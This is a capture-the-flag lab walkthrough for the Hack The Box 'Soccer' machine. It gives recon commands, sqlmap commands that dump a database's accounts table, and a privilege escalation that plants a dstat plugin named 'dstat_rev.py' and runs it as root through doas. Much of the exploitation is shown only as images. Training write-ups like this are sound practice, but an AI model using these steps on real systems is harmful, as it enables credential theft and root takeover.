# Soccer Hack The Box Tips

# ${{\color{purple}Initial Recon}}\ $

``nmap -sC -sV -oA soccer 10.10.11.194 -T4``

``22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) ``

``80/tcp   open  http            nginx 1.18.0 (Ubuntu)``

``9091/tcp open  xmltec-xmlmail? ``

# ${{\color{purple}Initial Foothold}}\ $

``ffuf -w /opt/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://FUZZ.soccer.htb/``

![image](https://user-images.githubusercontent.com/123066149/221426650-3ce1d6a0-387e-4b96-99c9-c57907264a0e.png)


``gobuster dir -u http://soccer.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30``

![image](https://user-images.githubusercontent.com/123066149/221426567-190f69c9-3246-4d37-a664-fda04cf7ea3f.png)

# ${{\color{purple}Exploitation}}\ $

![image](https://user-images.githubusercontent.com/123066149/221426683-45621127-e2e1-4f58-a4f0-f70179739fa6.png)

![image](https://user-images.githubusercontent.com/123066149/221426720-39fb117e-96f3-434c-abfd-d2957c87da51.png)

![image](https://user-images.githubusercontent.com/123066149/221426751-bb41721f-2bd1-47fa-8c82-6b50befd5de3.png)

![image](https://user-images.githubusercontent.com/123066149/221426793-6006262e-a75f-4eb4-9bac-778836aec9f7.png)

![image](https://user-images.githubusercontent.com/123066149/221426813-0d466cde-8718-4918-ae66-e73459ccfecb.png)

![image](https://user-images.githubusercontent.com/123066149/221426829-5a1433a3-5563-4453-896e-101884bb5f45.png)

![image](https://user-images.githubusercontent.com/123066149/221426874-d2c8f046-4ce2-409a-861c-eda11f80bd9f.png)

![image](https://user-images.githubusercontent.com/123066149/221426884-1d21bcdc-1e32-42dc-87a4-18788b927e5b.png)

![image](https://user-images.githubusercontent.com/123066149/221426924-e473c558-6c19-4768-aa46-fdafa8e19d65.png)

![image](https://user-images.githubusercontent.com/123066149/221426962-e3a759f0-702d-4b55-b28d-71af8be2cc67.png)

![image](https://user-images.githubusercontent.com/123066149/221426997-3907a810-e0cb-434e-962b-7b307b7c67c7.png)

![image](https://user-images.githubusercontent.com/123066149/221427051-8f2a2b3b-ee68-4070-8407-0df1ea273c41.png)

![image](https://user-images.githubusercontent.com/123066149/221427067-f0fde174-af34-4488-8d6c-fcf2a7e977a4.png)

![100](https://user-images.githubusercontent.com/123066149/221427390-f015d697-787f-402e-8dc1-db5ea71c5cde.PNG)

https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html

``python exploit.py``

![image](https://user-images.githubusercontent.com/123066149/221427259-74842338-5d88-4825-9ecf-67d5286aefdf.png)

![image](https://user-images.githubusercontent.com/123066149/221427625-c4f78986-4131-4fc2-911d-b6aa20eb8eae.png)

``sqlmap -u "http://localhost:8081/?id=" --level=3 --risk=2``

``sqlmap -u "http://localhost:8081/?id=" --current-db``

``sqlmap -u "http://localhost:8081/?id=" -D soccer_db --tables``

``sqlmap -u "http://localhost:8081/?id=" -D soccer_db -T accounts --dump``

![image](https://user-images.githubusercontent.com/123066149/221427478-c2986ffb-f813-4b86-83d0-e00711fa3128.png)

![image](https://user-images.githubusercontent.com/123066149/221427769-c84a68dc-b2b6-4090-96c0-80eef3cdecfb.png)

# ${{\color{purple}Privilege Escalation}}\ $

``nano dstat_rev.py``

``chmod +x dstat_rev.py``

``cp dstat_rev.py /usr/local/share/dstat``

``find / -name dstat -type d 2>/dev/null``

![image](https://user-images.githubusercontent.com/123066149/222103812-7f4b09a1-2fc2-47f4-be25-a526e60332ae.png)

``dstat --list``

![image](https://user-images.githubusercontent.com/123066149/222103985-dbbf03a3-cdd7-42a0-a59f-f28f6e0e4e79.png)

``doas -u root /usr/bin/dstat --rev``

![image](https://user-images.githubusercontent.com/123066149/222104190-f93b57ed-e508-419a-8a5e-7884191cb1eb.png)

# ${{\color{purple}Points of Improvement}}\ $
